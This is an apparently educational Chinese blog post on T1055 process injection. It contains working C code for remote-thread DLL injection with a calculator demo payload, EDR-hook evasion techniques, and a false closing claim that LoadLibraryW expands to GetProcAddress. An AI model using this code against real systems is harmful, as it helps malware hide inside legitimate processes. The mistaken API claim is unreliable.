---
layout: post
title: "【网络安全】T1055-进程注入"
subtitle: "长期更新"
date: 2025-02-21
author: "3thernet"
header-img: "img/city-1.jpg"
tags: []
---

> 由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。

进程注入（T1055）属于MITRE ATT&CK框架中的防御绕过（TA0005）战术，用于将恶意代码插入到合法进程来逃避基本检测。目前官网上给出了15种子技术。

参考书：《恶意代码分析实战》第1章 静态分析基础技术、第11章 恶意代码行为（11.6 用户态的Rootkit）、第12章 隐蔽的恶意代码启动

<del>先前总是依赖meterpreter/CobaltStrike的进程迁移，失败概率很高，因此决定还是让加载器直接实现进程注入。</del>

## 0x01 前置知识

在介绍进程注入技术前，这里补充一些前置内容，做过pwn的都很熟悉。

### 1.1 PE文件

可移植执行（PE）文件格式是Windows可执行文件、对象代码和DLL所使用的标准格式。PE文件格式其实是一种数据结构，包含为Windows操作系统加载器管理可执行代码所必要的信息。常见的后缀有：EXE, DLL, SYS, RCS, OCX等

PE文件头有价值的信息：

- 导入函数：恶意代码使用了哪些库的哪些函数
- 导出函数：恶意代码期望被其他程序或库所调用的函数
- 时间戳(见File Header)：程序是什么时候被编译的，**可以被伪造**
- 节表(Section Headers)：文件分节的名称，以及它们在磁盘与内存中的大小。若虚拟内存大小比原始数据大得多，往往意味着加壳代码的存在（特别是对于.text分节）
- 子系统(见Optional Header)：指示程序是一个命令行还是图形界面应用程序，`IMAGE_SUBSYSTEM_WINDOWS_CUI`表示是命令行窗口程序，`IMAGE_SUBSYSTEM_WINDOWS_GUI`表示程序在Windows系统内运行
- 资源：字符串、图标、菜单项和文件中包含的其他信息

PE文件中常见节：

- `.text`：包含了CPU执行命令。一般来说是唯一可以执行的节，也应该是唯一包含代码的节
- `.rdata`：通常包含导入与导出函数信息，还可以存储程序使用的其他只读数据
- `.data`：包含程序的全局数据，可以从程序任何地方访问
- `.rsrc`：包含可执行文件所使用的资源，如图标、图片、菜单项和字符串等。字符串可以存储在`.rsrc`节或者主程序里。在`.rsrc`经常存储的字符串是为了提供多语种支持的。

Windows不关心实际的分节名称，因为使用了PE头中的其他信息来确定如何使用一个分节。

### 1.2 静态链接、动态链接和运行时链接

众所周知，编译器生成可执行文件时需要先编译成目标文件（.obj/.o），再链接成可执行文件。

静态链接，又称编译时链接。当一个库被静态链接到可执行程序时，所有这个库中的代码都会被复制到可执行程序中，导致可执行程序增大很多。

动态链接，程序在编译时不完全链接所有的外部库，而是在程序运行时动态加载。

运行时链接，动态链接的一种形式，它通常通过 API 函数进行，例如 `LoadLibrary()/`（Windows）或 `dlopen()`（Linux）来动态加载库，然后通过 `GetProcAddress()` 或 `dlsym()` 获取函数地址。`LdrLoadDll()`和`LdrGetProcAddress()`也会被使用。

### 1.3 导入函数表(IAT)

PE文件头中存储了每个将被装载的库文件，以及每个会被程序使用的函数信息。

识别程序所使用的库与调用的函数尤为重要，可以用来猜测恶意代码样本干了什么事情（当然也可以反其道而行隐藏恶意代码行为）。例如一个程序导入了`URLDownloadToFile`函数，则可能从互联网下载一些内容，然后在本地文件中存储。

分析工具：CFF explorer或Dependency walker

实战中，常常为了节省时间使用[lazy_importer](https://github.com/JustasMasiulis/lazy_importer)隐藏程序导入函数表。

### 1.4 导出函数表

与导入函数类似。

PE文件中大多数EXE文件只有导入表而没有导出表，除非这个EXE对外提供可调用的功能，比如某些自解压缩的文件等。DLL通常是既有导出也有导入表。

## 1.5 DLL加载机制

操作系统使用虚拟内存为每个进程提供独立的地址空间，加载DLL时则根据DLL的映像大小（SizeOfImage：NT Header->Option Header）在虚拟地址空间分配一块连续内存。

每个 DLL 在编译时可以指定一个**首选基地址**（Preferred Base Address，通过链接器选项 `/BASE`）。如果 DLL 无法加载到其首选基地址，加载器会修改代码中的绝对地址（如跳转指令、全局变量地址），这一过程称为**重定位**。重定位依赖于 DLL 中的 `.reloc` 段。

>  例如，`kernel32.dll` 的默认基地址通常是 `0x7C800000`（Windows XP）或 `0x77E00000`（Windows 7+），但具体值可能因系统版本而异。

[微软文档](https://learn.microsoft.com/zh-cn/cpp/build/reference/base-base-address)指出：EXE 文件的默认基址是 0x400000（对于 32 位映像）或 0x140000000（对于 64 位映像）。 对于 DLL，默认基址是 0x10000000（对于 32 位映像）或 0x180000000（对于 64 位映像）。这里CFF Explorer查看`kernel32.dll`和`user32.dll`的`ImageBase`（Optional Header）都显示为0x180000000.

现代 Windows 默认启用 **ASLR**，这会随机化 DLL 的加载基地址，增加攻击者预测内存地址的难度。若 DLL 支持 ASLR（在 PE 头中设置 `DYNAMIC_BASE` 标志，CFF explorer->Nt Headers->Optional Header->DLLCharacteristics->DLL can move），其实际基地址会在进程启动时随机确定。

下面看一个简单的程序：

```c++
#include <windows.h>
#include <stdio.h>

int main() {
    //LoadLibrary("kernel32.dll");
    LoadLibrary("user32.dll");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    printf("kernel32.dll 基地址: 0x%p\n", hKernel32);
    printf("user32.dll 基地址: 0x%p\n", hUser32);
    return 0;
}
```

程序需要加载DLL后才能调取`GetModuleHandlerA`获取其在进程地址空间的位置，大多数程序默认都会加载`kernel32.dll`。需要注意的是上面的程序在Windows下多次执行打印的结果一样，因为Windows的ASLR在重启系统后才会改变偏移值。

运行结果：

```
kernel32.dll 基地址: 0x00007FFB503C0000
user32.dll 基地址: 0x00007FFB4E980000
```

了解DLL加载机制有助于未来我们自己编写shellcode，或者绕过EDR对敏感函数的Hook，比如一个手动内存操作的例子：

1. **动态获取kernel32.dll基址**
   通过遍历PEB结构获取kernel32.dll的加载地址
2. **解析导出表查找WinExec**
   手动解析PE导出表

完整例子参考：

- [一段shellcode的分析调试解释API地址的动态定位-zhyjc6's Blog](https://zhyjc6.github.io/posts/2019/10/19/编写通用的shellcode.html)
- [Shellcode - 小透的少年江湖](https://www.haoyun.website/2024/06/13/Shellcode/)

### 1.6 用户态Hook

安全产品（如 EDR、杀软）通过 Hook 用户态 API（如 `CreateRemoteThread`、`VirtualAllocEx`）监控进程行为，检测可疑操作（如进程注入、内存修改）。这种手法也可以被恶意代码使用，也称用户态的Rootkit.

**实现方式**：

- **Inline Hook**：修改 API 函数的前几个字节，插入跳转指令（如 `jmp`），将控制权转移到检测函数。
- **IAT Hook**：修改程序的导入地址表（IAT），将 API 调用重定向到检测函数。
- **异常处理 Hook**：通过注册异常处理程序拦截特定操作。

#### 绕过用户态Hook的关键技术

**(1) 直接系统调用（Syscall）**

- **原理**：
  绕过用户态 API，直接调用内核态系统调用（如 `NtCreateThreadEx` 替代 `CreateRemoteThread`）。
- **步骤**：
  1. 获取系统调用号（SSN）。
  2. 通过汇编或工具（如 Syswhispers）生成直接调用代码。
  3. 手动传递参数（需遵循 x64 调用约定）。
- **优势**：
  完全绕过用户态 Hook，EDR 无法通过 API 监控检测。
- **挑战**：
  不同 Windows 版本的系统调用号可能变化，需动态适配。

**(2) 恢复被 Hook 的代码**

- **原理**：
  找到被修改的 API 函数，还原其原始字节（如从磁盘文件或内存中的副本恢复）。
- **工具**：
  使用 `GetModuleHandle` 和 `GetProcAddress` 获取函数地址，对比内存与磁盘中的代码差异。
- **风险**：
  可能触发内存保护机制（如 PatchGuard）或导致系统不稳定。

**(3) 使用未监控的 API**

- **替代方案**：
  - 使用底层 API（如 `NtCreateSection` + `NtMapViewOfSection` 替代 `VirtualAllocEx` + `WriteProcessMemory`）。
  - 调用 COM 接口或未公开的 RPC 函数。

例：

```c
// 使用 NtCreateThreadEx 替代 CreateRemoteThread
NTSTATUS status = NtCreateThreadEx(
    &hThread, GENERIC_ALL, NULL, hProcess,
    (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMem,
    FALSE, 0, 0, 0, NULL
);
```

**(4) 内存操作与反射式注入**

- **原理**：
  手动在目标进程内存中分配、写入和加载代码，避免使用敏感 API。
- **技术**：
  - 反射式 DLL 注入：将 DLL 直接加载到内存并执行 `DllMain`，无需 `LoadLibrary`。
  - 进程镂空（Process Hollowing）：替换合法进程内存内容为恶意代码。

## 0x02 经典注入（T1055.001/002）

进程注入的原理是调用Windows API将恶意代码注入**合法进程空间**，然后创建远程线程执行。一旦被感染的进程加载了恶意DLL程序，OS会自动地调用该DLL编写的`DllMain`函数，这个函数拥有与被诸如进程访问系统的相同权限。

![](/img/2025-02-21-process-inject/1.png)

T1055.001和T1055.002的区别在于前者（001）使用dll落盘使用LoadLibrary加载，而后者（002）直接写入并执行Shellcode或PE文件，无需磁盘文件（可以结合反射注入或者自加载实现），如有引导头可以不用计算导出函数的偏移，直接传入所分配的地址。

1. **查找目标进程PID**：
   - 通过系统快照进行枚举，`CreateToolhelp32Snapshot`创建系统进程快照，`Process32First`或`Process32Next`遍历进程列表，获取进程名和PID
   - 通过`psapi.dll`中的函数`EnumProcess`枚举
   - 通过 `NtQuerySystemInformation` 枚举进程
   - 通过`WtsApi32.dll`中的函数进行枚举
   - 通过`ntdll.dll`中的函数进行枚举
2. **获取目标进程句柄**：
   使用API（如`OpenProcess`）打开目标进程（如`explorer.exe`）。
3. **在目标进程中分配内存**：
   调用`VirtualAllocEx`在目标进程中分配内存空间。
4. **写入DLL路径或代码**：
   使用`WriteProcessMemory`将DLL路径或二进制代码写入目标进程内存。
5. **创建远程线程执行DLL**：
   通过`CreateRemoteThread`调用`LoadLibraryA/W`函数，强制目标进程加载恶意DLL。

`CreateRemoteThread`函数：

```c
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,           // 目标进程句柄
  LPSECURITY_ATTRIBUTES  lpThreadAttributes, // 安全属性（通常为NULL）
  SIZE_T                 dwStackSize,        // 栈大小（0表示默认）
  LPTHREAD_START_ROUTINE lpStartAddress,     // 线程函数地址（关键参数）
  LPVOID                 lpParameter,        // 传递给线程函数的参数
  DWORD                  dwCreationFlags,    // 创建标志（如0表示立即执行）
  LPDWORD                lpThreadId          // 线程ID（可设为NULL）
);
```

三个重要参数：

1. `OpenProcess`函数获得的进程句柄(hProcess)

2. 注入线程的入口点(lpStartAddress)

   通常设置为`LoadLibrary`函数的地址

3. 线程的参数(lpParameter)

   使用恶意DLL名字作为参数

由于进程之间的内存隔离，必须要先通过`WriteProcessMemory`将DLL的路径字符串写入目标进程空间，再供`LoadLibraryA`调用。

接下来看具体的例子（省略掉枚举进程）：

```c++
#include <windows.h>

int main() {
    // 目标进程ID，假设这里打开一个记事本notepad.exe的进程ID为46392
    DWORD pid = 46392; 

    // 1. 获取目标进程句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. 在目标进程中分配内存
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
    
    // 3. 写入DLL路径到目标进程内存
    char dllPath[] = "E:\\malware.dll";
    WriteProcessMemory(hProcess, pRemoteMem, dllPath, sizeof(dllPath), NULL);
    
    // 4. 创建远程线程调用LoadLibraryA加载DLL
    HANDLE hThread = CreateRemoteThread(
        hProcess, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)LoadLibraryA, 
        pRemoteMem, 
        0, 
        NULL
    );
    
    // 清理句柄
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
```

DLL代码：

```c
#include <windows.h>

// 实际执行代码
void RunPayload() {
    WinExec("calc.exe", SW_SHOW); // 弹出计算器
}

// DLL 入口函数
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // 当DLL被加载时自动执行
            RunPayload();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

编译执行：

```cmd
gcc -o process_inject.exe process_inject.c
gcc -shared -o malware.dll malware.c
.\process_inject.exe
```

结果：

![](/img/2025-02-21-process-inject/2.png)

使用Process Explorer能够看见`malware.dll`已成功被导入：

![](/img/2025-02-21-process-inject/3.png)

Tips：

1. `LoadLibrary`只会加载一次DLL，重复运行程序无法弹出计算器
2. [微软](https://learn.microsoft.com/zh-cn/windows/win32/intl/unicode-in-the-windows-api)Windows API函数中的A和W分别表示ANSI和Unicode(UTF-16)，推荐使用`LoadLibraryW`

```c
    // 3. 写入DLL路径到目标进程内存
	LPCWSTR dllPath = L"C:\\中文路径\\malware.dll";
    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    WriteProcessMemory(hProcess, pRemoteMem, dllPath, pathSize, NULL);
	
	// 4. 创建远程线程调用LoadLibraryA加载DLL
    HANDLE hThread = CreateRemoteThread(
        hProcess, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)LoadLibraryW,
        pRemoteMem, 
        0, 
        NULL
    );
```

发现一些[文章](https://www.cnblogs.com/Xy--1/p/14506866.html)中会存在以下代码：

```c
HMODULE hModule = GetModuleHandle(L"kernel32.dll");
LPTHREAD_START_ROUTINE dwLoadAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryW");
HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)dwLoadAddr,
    pRemoteAddress,
    NULL,
    NULL
);
```

这是将当前进程中 `LoadLibraryW` 的地址传递给目标进程的远程线程。能成功执行的原因是：在 Windows 系统中，核心系统 DLL（如 `kernel32.dll`）的基地址在 **所有进程中通常是相同的**（即使启用了 ASLR）。

然而`LoadLibraryW` 本身就是一个宏，展开后即为 `GetProcAddress` 的调用，所以是完完全全的多此一举。

未完待续……

